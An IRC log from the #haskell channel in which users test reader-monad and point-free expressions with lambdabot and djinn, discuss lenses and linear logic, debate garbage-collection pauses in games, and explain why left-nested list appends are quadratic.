20:43:17 <lambdabot> Expr
20:43:41 <strager> hmm, really interesting
20:43:43 <parcs`> strager: the reader monad is pretty useless when using it with (>>)
20:43:52 <strager> yeah, I can see that =]
20:43:53 <c_wraith> :t f :: Expr -> Expr -> Expr -> Expr
20:43:53 <lambdabot> Expr -> Expr -> Expr -> Expr
20:43:54 <parcs`> :t f :: Expr -> Expr
20:43:55 <lambdabot> Expr -> Expr
20:43:57 <strager> First +1 was discarded
20:44:35 <c_wraith> :t f :: Expr -> (Expr -> Expr) -> Expr
20:44:35 <lambdabot>     Overlapping instances for Show (Expr -> Expr)
20:44:35 <lambdabot>       arising from a use of `f' at <interactive>:1:0
20:44:36 <lambdabot>     Matching instances:
20:44:51 <c_wraith> I wasn't anticipating *that*
20:44:53 <parcs`> > (do { a <- sin; b <- cos; c <- tan; return (a + b + c); }) 0
20:44:54 <lambdabot>   1.0
20:45:00 <strager> > ((+1) >>= (*)) 2  -- (2 + 1) * 2 => 6 ?
20:45:01 <lambdabot>   6
20:45:06 <parcs`> > (do { a <- sin; b <- cos; c <- tan; return (a + b + c); }) (pi/4)
20:45:07 <lambdabot>   2.414213562373095
20:45:18 <parcs`> that'sn probably a bad example
20:45:52 <parcs`> > (do { a <- sin; b <- cos; c <- tan; return (a, b, c); }) 0
20:45:53 <lambdabot>   (0.0,1.0,0.0)
20:45:54 <strager> Pretty cool
20:46:53 <strager> map (sin >>= const acos) [0,pi/4,pi/2]
20:46:58 <strager> > map (sin >>= const acos) [0,pi/4,pi/2]
20:46:59 <lambdabot>   [1.5707963267948966,0.6674572160283838,NaN]
20:47:09 <strager> > map (sin >>= const asin) [0,pi/4,pi/2]
20:47:10 <lambdabot>   [0.0,0.9033391107665127,NaN]
20:47:34 <strager> @pl \x y -> y
20:47:34 <lambdabot> const id
20:47:40 <strager> > map (sin >>= const id asin) [0,pi/4,pi/2]
20:47:41 <lambdabot>   Occurs check: cannot construct the infinite type: a = a -> b
20:47:59 <strager> mm, how do I ignore the state?
20:48:24 <strager> (I'm looking to do function composition using >>= or something)
20:50:10 <strager> > map (sin >>= return asin) [0,pi/4,pi/2]
20:50:11 <lambdabot>   [0.0,0.9033391107665127,NaN]
20:50:22 <strager> > map (sin >>= return . asin) [0,pi/4,pi/2]
20:50:24 <lambdabot>   [0.0,0.7853981633974482,1.5707963267948966]
20:52:05 <parcs`> :t \f g -> f >>= flip (const g)
20:52:07 <lambdabot> forall a b b1. (b1 -> a) -> (a -> b) -> b1 -> b
20:53:32 <kamishimo> :t map
20:53:33 <lambdabot> forall a b. (a -> b) -> [a] -> [b]
20:53:50 <kamishimo> :t map
20:53:51 <lambdabot> forall a b. (a -> b) -> [a] -> [b]
20:54:40 <kamishimo> testtest
20:55:04 <tgeeky_> man... I be @djinn gets every single one of these functions right just from their types: http://hackage.haskell.org/packages/archive/data-aviary/0.2.3/doc/html/Data-Aviary-Birds.html
20:55:55 <tgeeky_> so far it's gotten every one i've tested
20:56:39 <strager> > map (sin >>= flip (const asin)) [0,pi/4,pi/2]
20:56:41 <lambdabot>   [0.0,0.7853981633974482,1.5707963267948966]
20:56:59 <strager> > map (asin . sin) [0,pi/4,pi/2]
20:57:01 <lambdabot>   [0.0,0.7853981633974482,1.5707963267948966]
20:57:22 <strager> I thought asin . sin == id, for appropriate ranges
20:57:32 <strager> wait, duh
20:57:43 <strager> > map id [0,pi/4,pi/2]
20:57:44 <lambdabot>   [0.0,0.7853981633974483,1.5707963267948966]
20:57:51 <strager> 'tis ;P
20:57:59 <strager> I think return . is cooler though.
20:58:04 <strager> I don't like flip.
21:15:35 <luite> > [pi/1,p/2..]
21:15:36 <lambdabot>   *Exception: not a number
21:15:43 <dmwit> ?djinn (a -> b -> b) -> a -> b -> a -> b
21:15:43 <lambdabot> f a b c _ = a b c
21:15:53 <luite> ^ didn't expect that one...
21:15:55 <dmwit> tgeeky_: nope =)
21:16:03 <ibid> > [pi/1,pi/2..]
21:16:04 <lambdabot>   [3.141592653589793,1.5707963267948966,0.0,-1.5707963267948966,-3.1415926535...
21:16:07 <luite> ah
21:16:12 <luite> it's too late for me
21:16:12 <ibid> just a typo :)
21:16:18 <dmwit> tgeeky_: (see "jay")
21:20:40 <greymalkin> map (pi/) [1..]
21:21:13 <dmwit> > zipWith (-) [pi/1,pi/2..] (map (pi/) [1..])
21:21:14 <lambdabot>   [0.0,0.0,-1.0471975511965976,-2.356194490192345,-3.7699111843077517,-5.2359...
21:21:46 <dmwit> Not the same sequence at all. =)
21:22:44 <greymalkin> No, I know. I just wanted to check... apparently lambdabot doesn't like me.
21:22:55 <dmwit> Oh, you just need more "> " at the beginning of your line.
21:23:27 <dmwit> 3
21:23:30 <dmwit> > 3
21:23:31 <lambdabot>   3
21:23:55 <dmwit> The conceit is that it's a bit like literate Haskell. =)
21:25:58 <tgeeky_> dmwit: hm. was that the first one alphabetically that didn't work? Or did you just try them at random?
21:26:09 <tgeeky_> dmwit: I bet it's because the pl version of jay has a fixpoint
21:26:13 <tgeeky_> @pl f x y z = f x (f z y)
21:26:14 <lambdabot> f = fix (liftM2 flip (((.) . (.)) .) flip)
21:26:31 <dmwit> I didn't try at random -- I tried ones which I thought would be hard for ?djinn.
21:26:44 <dmwit> I got lucky: I was right about the first one. =)
21:26:46 <tgeeky_> dmwit: you so smrt. S.M.R.T! :O
21:28:23 <tgeeky_> dmwit: what part of the typesig hinted that it would be difficu.t?
21:28:28 <mikeplus64> anyone familiar with cabal-dev?
21:28:33 <greymalkin> Whats djinn?
21:28:46 <mikeplus64> if so, how would I specify to build with dynamic libs?
21:28:48 <tgeeky_> @hackage djinn
21:28:48 <lambdabot> http://hackage.haskell.org/package/djinn
21:28:48 <dmwit> tgeeky_: It's easy to write a function which ignores many of the arguments -- a weak spot of djinn.
21:29:10 <dmwit> s/a function/a function with that type/
21:29:12 <mikeplus64> with normal cabal i just specify shared: True in ~/.cabal/config, dunno what the equivalent for cabal-dev is
21:29:25 <jfischoff> dmwit: now if we could ensure information preservation … :)
21:29:43 <dmwit> =)
21:30:24 <dmwit> I think there are actually some theorem provers for linear logics.
21:30:36 <jfischoff> oh cool
21:30:59 <jfischoff> ski: should me this http://www.lix.polytechnique.fr/~dale/lolli/
21:32:23 <jfischoff> looks interesting
21:34:14 <dmwit> jfischoff: www.cs.cmu.edu/~fp/talks/fcs05-talk.pdf
21:34:58 * jfischoff is reading
21:35:23 <dmwit> This is what I was thinking of when I said that, but this seems to be an authorization logic, not a linear logic.
21:35:39 <dmwit> Still, "linear logic theorem prover" has a lot of hits on Google. =)
21:35:51 <jfischoff> :)
21:36:14 <jfischoff> I wonder if a linear logic theorem prover could derive lenses for haskell?
21:36:48 <jfischoff> some lenses
21:36:51 <tertl3> what is lenses?
21:37:08 <dmwit> Unfortunately, linearity actually isn't enough to give the guarantees you need for not-deleting-information (and neither for lenses).
21:37:17 <jfischoff> oh well
21:37:29 <dmwit> For example, a linear function on (A+A) can do something like this
21:37:41 <dmwit> f x = case x of Left a -> a; Right a -> a
21:37:55 <dmwit> This deletes information (namely, the tag), and is not reversible in any good lens framework.
21:38:16 <greymalkin> ?djinn [(a,b)] -> [(b,a)]
21:38:17 <lambdabot> Error: Undefined type []
21:38:28 <dmwit> Um, let me weaken that claim.
21:38:36 <dmwit> Many good lens frameworks can reverse that. =P
21:38:43 <jfischoff> :)
21:38:44 <dmwit> But it's certainly not an isomorphism.
21:39:05 <greymalkin> ?djinn (a,b) -> (b,a)
21:39:06 <lambdabot> f (a, b) = (b, a)
21:39:24 <dmwit> So it's something like linearity + an analysis saying that different branches of case statements can never output the same value.
21:39:43 <greymalkin> ?djinn (a,b) (a -> b) (b -> a) -> (b,a)
21:39:43 <lambdabot> Error: kind error: (KArrow KStar (KVar 2),KStar)
21:39:55 <greymalkin> ?djinn (a,b) -> (a -> b) -> (b -> a) -> (b,a)
21:39:55 <lambdabot> f (a, b) c d = (b, d (c a))
21:39:57 <dmwit> tertl3: Lenses are my research topic.
21:40:05 <dmwit> tertl3: Here's my favorite intro to them:
21:40:07 <jfischoff> dmwit: yeah each type must be unique
21:40:17 <dmwit> http://twanvl.nl/blog/haskell/overloading-functional-references
21:40:42 <dmwit> jfischoff: Well, that's the tricky thing: you want the *type* to be the same across all branches. It's just that you want the *values returned* to never overlap.
21:41:04 <gseitz> dmwit: did you write the paper on synchronous lenses? (I forgot the exact title)
21:41:22 <jfischoff> dmwit: ah
21:41:22 <dmwit> I've written two papers on lenses: "Symmetric Lenses" and "Edit Lenses".
21:41:31 <jfischoff> oh to bed!
21:41:36 <jfischoff> off ;)
21:41:40 <dmwit> bye =)
21:41:43 <gseitz> right, I meant Edit Lenses. thanks
21:41:52 <dmwit> cool, great =)
21:41:54 <greymalkin> Hehe.. not what I was expecting; but then I have no idea what to expect from djinn :)  Thank you for introducing me to it!
21:42:22 <dmwit> greymalkin: You're lucky. Early ?djinn would have answered f (a,b) _ _ = (b,a)
21:42:25 <dmwit> =)
21:42:35 <tertl3> lenses is a funtional ref ?
21:42:54 <dmwit> A functional reference is one kind of lens, yep.
21:43:18 <greymalkin> Lol! I was expecting that, but hoping for f a b c d = ( d a, c b )
21:43:29 <ski> (arg, just missed jfishoff)
21:44:44 <greymalkin> Er... with (a,b) tupled on the left
21:44:57 <catery> rts game in haskell feasible?
21:45:04 <tertl3> no
21:45:08 <catery> why no?
21:45:13 <ski> @tell jfischoff (you quite too fast :) -- "should me this http://www.lix.polytechnique.fr/~dale/lolli/" -- can't parse -- in any case Lolli is cool stuff :) -- it may help to look at lambdaProlog <http://www.lix.polytechnique.fr/Labo/Dale.Miller/lProlog/> first, though
21:45:13 <lambdabot> Consider it noted.
21:45:28 <tertl3> well what kind of rts?
21:45:40 <tertl3> turn based?
21:45:50 <tertl3> or like AoE?
21:46:03 <dmwit> I'm with catery: why no?
21:46:18 <tertl3> dont take me seriously yet
21:46:44 <tertl3> I am new to functional programming and even newer to haskell
21:46:47 <dmwit> I mean, socially speaking it's going to be hard to find somebody who's both looking to fund an RTS and interested in taking a risk on Haskell.
21:46:51 <tertl3> I started with F#
21:47:48 <catery> rts stands for real time strategy, so it can't be turn based
21:48:04 <tertl3> lol, derp on tert
21:48:11 * ski . o O ( Run-Time System )
21:48:14 <mikeplus64> catery: course an rts would be feasible
21:48:21 <catery> because...
21:48:22 <Ralith> not necessarily easy
21:48:24 <Ralith> but feasible.
21:48:25 <mikeplus64> practical, don't know
21:48:31 <mikeplus64> fun, yeah
21:48:33 <tertl3> thats what I meant
21:48:39 <tertl3> impractical
21:48:39 <dmwit> The people who know a thing or two about game programming (that is, not me) have in the past said that garbage-collected languages are an especially hard sell because of the occasional longish GC interrupting play.
21:48:53 <Ralith> that's a pretty obsolete claim
21:49:02 <catery> I thought of that dmwit but then i'm confused why there are games in Java
21:49:02 <Ralith> also: someone wrote a barely-functional fps in haskell once
21:49:11 <Ralith> catery: C# is pretty popular for gamedev too
21:49:18 <mikeplus64> i wrote a snake ii game in haskell
21:49:20 <tertl3> C3 gave rise to terraria
21:49:22 <catery> isn't C# garbage collected too?
21:49:23 <tertl3> C#*
21:49:25 <Ralith> yes.
21:49:31 <dmwit> Ralith: I'm thrilled to hear that.
21:49:34 <mikeplus64> 2D stuff haskell is going to be great at
21:49:34 <Ralith> probably the people that make that claim are biased in favor of C++ or summat
21:49:35 <catery> so how come the garbage collection pauses aren't a problem for c# games
21:49:52 <mikeplus64> catery: because C# games tend to be simpler 2D affairs
21:49:54 <tertl3> they arent high grphics
21:49:56 <mikeplus64> like spacechem
21:49:56 <Ralith> they generally aren't a problem for games in any GC'd language.
21:49:58 <greymalkin> there's certainly room for the game logic to be implemented in haskell -- many games I've seen recently have a core C/C++ engine with the game logic delegated out through a scripting or other dynamic languag.
21:50:17 <strager> catery: Because they are programmed carefully, or because the games are casual games.
21:50:46 <strager> For some definition of 'carefully'
21:51:08 <catery> Ok what is a modern opinion on Java's garbage collection, we can all agree that Java JVM sucked shit 10 years ago, but things are different now, can the modern Java JVM do real time garbage collection?
21:51:36 <strager> Do you mean concurrent GC or incremental GC, or both?
21:51:49 <catery> strager thank you for volunteering to explain to me what both are
21:51:50 <mikeplus64> minecraft manages it somehow, but i have a feeling they use a super duper C -> java graphics lib
21:51:51 <strager> Or "some GC technique(s) which have no pauses"
21:52:02 <greymalkin> ?djinn f (a -> b -> c) -> (f a -> f b -> f c)
21:52:03 <lambdabot> -- f cannot be realized.
21:52:08 <strager> concurrent: GC can be run while the program is running
21:52:08 <shachaf> I don't know much about it but heard second-hand rumors that the JVM's GC is quite good.
21:52:18 <shachaf> Better than GHC's.
21:52:18 <greymalkin> ?djinn x f (a -> b -> c) -> (f a -> f b -> f c)
21:52:19 <lambdabot> -- f cannot be realized.
21:52:24 <strager> incremental: GC's can collect only a part of the heap, leading to smaller collections.
21:52:49 <catery> how does concurrent gc work without locking slowing everything down?
21:53:06 <strager> I don't know.  Maybe Wikipedia can help.
21:53:09 <ski> catery : dirty bits, i think
21:53:19 <strager> Isn't GHC's GC concurrent?
21:53:35 <dmwit> GHC has parallel minor collections, but stop-the-world major collections.
21:53:37 <ski> pages which are written to are marked dirty, so that the GC will have to revisit them
21:54:13 <ski> strager : is "incremental" the same as "generational", then ?
21:54:19 * dmwit pretends to know what he is talking about
21:54:32 <ski> or is the latter a special case of the former, perchance ?
21:54:53 <catery> ok lets phrase this question in another way: Is it really true that the garbage collection makes a modern AAA game impossible to make or is it that everyone assumed its impossible but no one bothered to actually build a prototype and ACTUALLY measure the performance hit of garbage collection
21:54:59 <strager> They're related, but I don't know how.  They may be synonyms.
21:55:10 <strager> I'm no expert, and I don't even have experience writing or reading a GC.
21:55:52 <qtplatypus> catery: No body has truely tested it.
21:55:57 <greymalkin> catery: I doubt that it's been tested.
21:56:09 <strager> catery: GC hits *are* a problem; that is well known.  Game programmers know to reduce GC hits where it's important.  Typically this means not performing allocations in the main game loop.  Even C++ game programmers know this.
21:56:18 <catery> so everyone was lazy and assumed that everyone else already did the statistics?
21:56:25 <greymalkin> The social stigma on GCs of the past is still too strong for most financial backers.
21:56:30 <strager> I don't think it's been scientifically studied though.
21:56:52 <strager> And, really, it's a case-by-case basis thing.
21:57:09 <strager> It doesn't make sense to microbenchmark something like a GC.  You need large applications to get reasonable data.
21:57:11 <qtplatypus> There are real time Garbage collections.
21:57:26 <strager> "Allocate then dispose 1MB per second" is pretty wierd, for example.
21:58:56 <c_wraith> There are game projects in GHC. Ultimately, no one has tried to do something like (in terms of content and technologies) a AAA title in GHC.
21:59:01 <qtplatypus> http://www.ibm.com/developerworks/java/library/j-rtj4/ covers a number of ideas that would most likely be applicable.
21:59:32 <catery> Why are there more games in Java than in Haskell then, they are both GC
21:59:38 <c_wraith> It's likely GHC's GC isn't going to do the job without a lot of care.  It's not well-tuned for real-time systems.
21:59:52 <Ralith> catery: because more people use java than haskell.
21:59:53 <greymalkin> catery: There are more people that know java...
21:59:57 <Ralith> did you really need to ask that?
22:00:25 <catery> ok so you guys gonna fix GHC's GC to make it better?
22:00:34 <dmwit> Yes, it is a topic of active research.
22:00:55 <catery> why can't they just copy paste java's gc into ghc
22:01:05 <Ralith> why do you think GHC's GC is insufficient?
22:01:13 <dmwit> Because Java is a very different language than Haskell.
22:01:21 <c_wraith> the jvm's GC is built on entirely different assumptions than are true in haskell
22:01:26 <dmwit> The papers on GHC's GC detail the differences quite carefully.
22:01:43 <dmwit> Perhaps you should read one of them -- they're quite accessible.
22:02:17 <c_wraith> Simon Marlow is fantastic at writing readable papers
22:02:18 <strager> Hey, why don't we copy all of GCC's optimizations into GHC?
22:03:12 <catery> what is the histogram on typical GC pause length?
22:03:55 <dmwit> See the "Publications" section on Simon's page: http://research.microsoft.com/en-us/people/simonmar/
22:04:10 <dmwit> strager: That's what -fllvm does. =D
22:04:52 <greymalkin> Oh... neet! I like the nursury idea as a sort of "staging heap"
22:05:43 <strager> ;P
22:06:11 <rata_> how can I make this code work? let snoc xs x = xs ++ [x] in foldr snoc [] [1..1000000]
22:06:19 <dmwit> catery: Very application-specific. Build something and use ThreadScope to find out!
22:06:52 <dmwit> > let snoc x xs = xs ++ [x] in foldr snoc [] [1..1000]
22:06:54 <lambdabot>   [1000,999,998,997,996,995,994,993,992,991,990,989,988,987,986,985,984,983,9...
22:07:02 <dmwit> > reverse [1..1000]
22:07:03 <lambdabot>   [1000,999,998,997,996,995,994,993,992,991,990,989,988,987,986,985,984,983,9...
22:07:17 <dmwit> > let snoc xs x = xs ++ [x] in foldl' snoc [] [1..1000]
22:07:19 <lambdabot>   [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28...
22:07:35 <dmwit> whoops! =)
22:07:44 <catery> ok dmwit you gonna help me on rts project in haskell?
22:07:47 <catery> you volunteering?
22:07:49 <dmwit> > foldl' (flip (:)) [] [1..1000]
22:07:50 <lambdabot>   [1000,999,998,997,996,995,994,993,992,991,990,989,988,987,986,985,984,983,9...
22:08:40 <dmwit> I have enough on my plate monitoring #haskell, thanks.
22:08:50 <catery> monitor #haskell for what
22:09:08 <c_wraith> people asking questions!
22:09:19 <c_wraith> the other ~800 people can't answer them as well!
22:09:22 <c_wraith> :)
22:09:26 <rata_> dmwit: if I use 1000000 it stack-overflows
22:09:43 <ski> c_wraith : exactly !
22:09:50 <rata_> even if I use foldl'
22:10:02 <c_wraith> rata_: foldl' doesn't make a difference with reverse.
22:10:22 <rata_> c_wraith: what do you mean?
22:10:46 <c_wraith> rata_: I mean the thunk it eliminates is basically the same as the constructor it creates
22:11:13 <rata_> c_wraith: but I'm not using reverse
22:11:27 <c_wraith> (if the thunk is ever even created..  I think flip (:) will be treated as a CONLIKE function by the optimizer
22:11:47 <dmwit> rata_: cannot reproduce: even up to 100000000 it doesn't stack overflow here
22:11:49 <c_wraith> rata_: oh, I was looking at dmwit's code, not yours
22:12:21 <dmwit> Though it does take rather a long time.
22:13:07 <ski> rata_ : are you talking about dmwit's  foldl' (flip (:)) []  here ?
22:13:13 <ski> rata_ : or your version ?
22:13:41 <dmwit> I suppose it doesn't hurt to ask which version of the code he's trying, yeah.
22:14:41 <dmwit> Anyway, this is a pretty pessimal algorithm.
22:14:58 <rata_> really? well, the actual code I'm using is main = putStrLn $ foldr snoc [] [1..1000000] where snoc x xs = xs ++ [x]
22:15:28 <rata_> dmwit: is it better to use reverse?
22:15:46 <c_wraith> reverse is O(n) time.  your algorithm is O(n^2) time
22:15:48 <rata_> ghc version = 7.4.1
22:16:14 <rata_> c_wraith: why is it O(n^2)?
22:16:32 <rata_> ++ is O(n)?
22:16:44 <qtplatypus> rata_: Yes
22:16:45 <c_wraith> because you're building up a chain of n applications of ++, with an ever-growing first argument
22:17:11 <c_wraith> xs ++ ys is O(length xs), in particular
22:17:12 <rata_> I thought ++ would be O(1)
22:17:46 <rata_> ok
22:18:09 <qtplatypus> @src (++)
22:18:09 <lambdabot> []     ++ ys = ys
22:18:09 <lambdabot> (x:xs) ++ ys = x : (xs ++ ys)
22:18:09 <lambdabot> -- OR
22:18:09 <lambdabot> xs ++ ys = foldr (:) ys xs
22:18:19 <ski> rata_ : multiple *left*-associated `(++)' calls are `O(n^2)'
22:18:41 <ski> rata_ : `((foo ++ bar) ++ baz) ++ quux' is bad, `foo ++ (bar ++ (baz ++ quux))' is fine
22:19:01 <ski> rata_ : similarly, writing a recursive function like `f x = f (...) ++ something' is bad
22:20:05 <ski> (not quite as bad if the recursive function only calls itself upto `O(log n)' depth instead of e.g. `O(n)', where `n' is the size of the input, but still bad)
22:21:30 <qtplatypus> ski: Given that ++ is associative why can't the optimizer transform all (x ++ y ) ++ z into x ++ (y ++ z)
22:22:01 <ski> rata_ : the problem with `((foo ++ bar) ++ baz) ++ quux' is that we'll traverse `foo' once (copying it), then we'll traverse the copy of `foo' once, together with traversing `bar', then we'll traverse the new copy of `foo' again, and also the copy of `bar' (and also traversing `baz', of course)
22:22:27 <dmwit> qtplatypus: What's your cunning plan for the optimizer for ski's recursive "f x = f (...) ++ something"?
22:22:34 <ski> qtplatypus : a `RULES' pragma would work in that explicit situation, but not in the `f x = f (...) ++ something' situation
22:23:01 <ski> qtplatypus : however, there are optimizations which can spot this kind of calling pattern (there's a paper that i don't recall the title of)
22:23:03 <dmwit> qtplatypus: (It *can* be done, but it's harder than just reassociating code at the textual level.)
22:23:07 <coppro> rata_: Lists in Haskell are singly-linked. You must find the last element of the first list to append two together.
22:23:21 <ski> (and i'm not sure how often that optimization can spot an opportunity for this)
22:23:25 <rata_> coppro: why doesn't a list store the memory address of the last elemt, it'd make concatenation O(n) right?
22:23:36 <dmwit> rata_: Remember: immutable.
22:23:44 <dmwit> Even with a pointer to the end, you're not allowed to change that pointer.
22:23:55 <qtplatypus> rata_: What is the last element of [0..] ?
22:24:03 <ski> rata_ : well, if you wanted to, you could implement "lists" (really sequences) as a kind of tree
22:24:16 <ski> then you'd get `O(1)' concatenation
22:24:24 <otters> so I'm using modify from StateT (which has type Kevin -> Kevin here, my datatype) and have defined a helper onField :: (a -> a) -> Kevin -> Kevin which modifies a field of Kevin
22:24:32 <rata_> qtplatypus: NULL? =P
22:24:42 <ski> rata_ : no
22:24:47 <ski> there is no last element of an empty list
22:24:53 <ski> er, infinite list
22:25:06 <dmwit> otters: Sounds sane so far.
22:25:07 <greymalkin> (right on both counts)
22:25:07 <ski> (you can't even detect programatically that it *is* an infinite list)
22:25:10 <otters> okay
22:25:38 <otters> dmwit: so I have a list, and I want to call onField for each element of the list, but I don't want to call modify multiple times
22:25:42 <rata_> ski: you can check that statically right?
22:26:37 <otters> errr
22:26:38 <otters> hmm
22:26:47 <ski> rata_ : no
22:27:05 <otters> let's just use the actual names
22:27:23 <ski> rata_ : i can e.g. write a list that is the aliquot sequence of `256'
22:27:31 <otters> onField is actually onPrivclasses, which takes (P -> P) -> Kevin -> Kevin
22:27:32 <ski> noone knows whether this list is infinite or not
22:27:45 <otters> and setPrivclass is Chatroom -> Privclass -> P -> P
22:28:02 <ski> rata_ : the compiler being able to check this statically would mean that the compiler would need to prove something that no mathematician currently knows how to prove
22:28:04 <otters> and adds some privclass, under the chatroom name, to P, which is a privclass store (type alias for a map)
22:28:14 <rata_> ski: ok
22:28:18 <greymalkin> Who sent the stuff on overloading functional references earlier?
22:28:28 <ski> basically, if the compiler could do this, there would be less jobs for mathematicians
22:28:42 <dmwit> greymalkin: yo
22:28:51 <otters> so what I'm doing is modify (onPrivclasses (setPrivclass room pc1 . setPrivclass room pc2 . setPrivclass room pc3 ...))
22:28:59 <qtplatypus> rata_: I could write a list that is the states of a turing mechine.  If I could statically find if the list was finite then I would also be able to solve the halting problem.
22:29:01 <otters> but I have a variable number of privclasses and I want to combine them all
22:29:22 <greymalkin> Is it just me, or does 'update' have the wrong type? It seems to leave you with (s -> s), but is composed into 'set', which just leaves s
22:29:26 <ski> rata_ : you *can*, however, *approximate*, statically analyzing the code to determine that "this list is definitely infinite", and "this is definitely finite", and "we don't know about this list"
22:29:34 <ski> (e.g. using "abstract interpretation")
22:30:03 <rata_> ski: yes, something like that is what I meant
22:30:25 <dmwit> greymalkin: Looks like it has the right type to me.
22:30:35 <dmwit> greymalkin: Remember, a -> (b -> c) and a -> b -> c are the same type.
22:31:01 <dmwit> otters: Choose between using Endo and mconcat or using foldr (.) id
22:31:09 <dmwit> otters: They amount to roughly the same thing.
22:31:16 <otters> Hmm, okay
22:31:26 <greymalkin> :t update :: FRef s a -> (a -> a) -> (s -> s)
22:31:27 <lambdabot> Not in scope: `update'
22:31:27 <lambdabot> Not in scope: type constructor or class `FRef'
22:31:29 <dmwit> :t appEndo . mconcat . map Endo
22:31:30 <lambdabot> forall a. [a -> a] -> a -> a
22:31:35 <dmwit> :t foldr (.) id
22:31:36 <lambdabot> forall b. [b -> b] -> b -> b
22:31:56 <ski>   modify (onPrivclasses (composeMap (setPrivclass room) [pc1,pc2,pc3,...]))
22:32:06 <dmwit> right
22:32:54 <rata_> what does the (...) mean in ghc's heap profiler?
22:33:08 <ski> @let compose :: [a -> a] -> (a -> a); compose = foldr (.) id  -- alternatively `compose = flip (foldr ($))'
22:33:09 <lambdabot>  Defined.
22:33:22 <dmwit> greymalkin: update :: FRef s a -> (a -> a) -> (s -> s); update ref f s = {- ref :: FRef s a, f :: a -> a, s :: s, and we must produce something of type s -}
22:33:54 <ski> @let composeMap :: (a -> (b -> b)) -> [a] -> (b -> b); composeMap = compose .: map
22:33:55 <lambdabot>  Defined.
22:34:18 <otters> dmwit: thanks! that did it
22:34:29 <solidus-river> are the capabilities of imperative and functional languages equal?
22:34:55 <dmwit> Both can compute the same functions: they are each Turing complete.
22:35:08 <dmwit> But that does not mean there is no reason to prefer one or the other.
22:35:33 <solidus-river> right, i was just wondering if they were both equatable as far as the limits of their computation
22:35:44 <greymalkin> Hmm.. I thought it should be update :: FRef s a -> (a -> a) -> s
22:35:48 <geekosaur> that's Turing completeness
22:35:52 <solidus-river> ^
22:35:53 <otters> heh
22:36:24 <greymalkin> Ah... nevermind. I see.
22:36:29 <otters> so flip (foldr ($)) is [c -> c] -> c -> c, foldr (.) id is [b -> b] -> b -> b, and appEndo . mconcat . map Endo is [a -> a] -> a -> a
22:36:42 <otters> how is the type variable name chosen?
22:36:43 <greymalkin> I keep mentally putting arrows between type descriptors
22:36:57 <dmwit> otters: From the types of the constituents.
22:36:59 <dmwit> :t ($)
22:37:00 <lambdabot> forall a b. (a -> b) -> a -> b
22:37:04 <dmwit> eh
22:37:05 <dmwit> :t flip
22:37:06 <lambdabot> forall (f :: * -> *) a b. (Functor f) => f (a -> b) -> a -> f b
22:37:11 <dmwit> :t Prelude.flip
22:37:12 <lambdabot> forall a b c. (a -> b -> c) -> b -> a -> c
22:37:18 <dmwit> There's your c, probably.
22:37:22 <dmwit> :t (.)
22:37:23 <lambdabot> forall a b (f :: * -> *). (Functor f) => (a -> b) -> f a -> f b
22:37:31 <dmwit> ... Caleskell--
22:37:36 <dmwit> :t (Prelude..)
22:37:42 <otters> I see
22:37:48 <catery> dmwit: hypothetically if I wanted to fix GHC's GC so that it wasn't crap at rts games what book would I pick up to understand garbage collection from scratch
22:38:00 <ski> @type ((appEndo . mconcat) .) . map . (Endo .)
22:38:01 <dmwit> You're asking the wrong guy.
22:38:15 <ski> preflex: slap lambdabot
22:38:25 <dmwit> I use Haskell in part so I don't have to think about memory management.
22:38:35 <lambdabot> forall b c a. (b -> c) -> (a -> b) -> a -> c
22:38:35 <lambdabot> forall a a1. (a -> a1 -> a1) -> [a] -> a1 -> a1
22:38:55 <dmwit> catery: Have you tried reading the paper I suggested before?
22:39:23 <catery> I need a book
22:39:29 <catery> one paper isn't going to teach me enough
22:39:49 <ski> @type ((appEndo . mconcat) .) . map . (Endo .)
22:39:50 <ski> @type (appEndo .) . Data.Foldable.foldMap . (Endo .)
22:39:50 <lambdabot> forall a a1. (a -> a1 -> a1) -> [a] -> a1 -> a1
22:39:51 <dmwit> If you haven't got the patience for one paper, why should I believe you'll get a book?
22:39:51 <lambdabot> forall a a1 (t :: * -> *). (Data.Foldable.Foldable t) => (a1 -> a -> a) -> t a1 -> a -> a
22:40:15 <ski> (someone write the latter, using `ala' or `under' ?)
22:40:30 <ski> (well, or the former)
22:40:55 <dmwit> :t ala Endo foldMap
22:40:57 <lambdabot> Not in scope: `foldMap'
22:41:03 <dmwit> :t ala Endo Data.Foldable.foldMap
22:41:04 <lambdabot> forall a (t :: * -> *). (Data.Foldable.Foldable t) => t (a -> a) -> a -> a
22:42:31 * ski doesn't understand `ala' yet
22:42:38 * dmwit neither
22:42:51 <catery> dmwit: ok which paper were you talking about: title
22:43:25 <dmwit> Why not start at the top and see how much you learn by the time you hit the bottom?
22:43:53 <catery> ok uh which site are we talking about again :)
22:44:00 <dmwit> Or start at the bottom and work your way up, if chronological order is your thing.
22:44:06 <ski> @type let (.) = (Prelude..) in ala (Endo .) Data.Foldable.foldMap
22:44:07 <dmwit> http://research.microsoft.com/en-us/people/simonmar/ <- "Publications" section
22:44:07 <lambdabot> forall a a1 (t :: * -> *). (Newtype (a1 -> Endo a) (a1 -> a -> a), Data.Foldable.Foldable t) => t (a1 -> a -> a) -> a1 -> a -> a
22:44:10 <ski> there we are
22:44:24 <ski> @type ala (Endo .) Data.Foldable.foldMap  -- Caleskell version
22:44:25 <lambdabot> forall a (f :: * -> *) (t :: * -> *). (Newtype (f (Endo a)) (f (a -> a)), Monoid (f (Endo a)), Data.Foldable.Foldable t, Functor f) => t (f (a -> a)) -> f (a -> a)
22:44:33 <dmwit> ski: Where are you, exactly?
22:44:40 <ski> um, here ?
22:44:45 <dmwit> ski: I don't think there's a Newtype (a -> Endo b) (a -> b -> b) instance...
22:44:51 * ski is probably confused
22:45:05 <ski> you're probably right
22:45:06 <dmwit> You Haskell programmers' eyes just skip right over those contexts...
22:45:31 <ski> heeh, guilty as charged :)
22:45:50 <catery> dmwit: is there a paper on garbage collection thats not in the context of haskell?
22:46:05 <ski> probably many
22:46:14 <dmwit> Not on Simon Marlow's page.
22:46:16 <ski> Hans Böhm might have written some
22:46:56 <dmwit> You could look through the citations page of any of Marlow's GC papers, though, and get plenty of suggestions.
22:48:04 <catery> dmwit: NEED BOOK :(
22:48:13 <catery> book for noobies
22:48:39 <dmwit> Well, I hope somebody can help you.
22:48:49 <ski> book about ?
22:49:18 <catery> dmwit: i know you secretly have a phd in GC, go write a book on it
22:49:27 <ski> iirc "Modern Compiler Implementation in (ML|Java|C)" talk some about GCs
22:49:48 <ski> catery : check if your uni library has the book ?
22:53:18 <ski> catery : *nod*, it does, chapter 13 (in 1st ed.) : "Mark-and-sweep collection","Reference counts","Copying colelction","Generational collection","Incremental collection","Baker's algorithm"
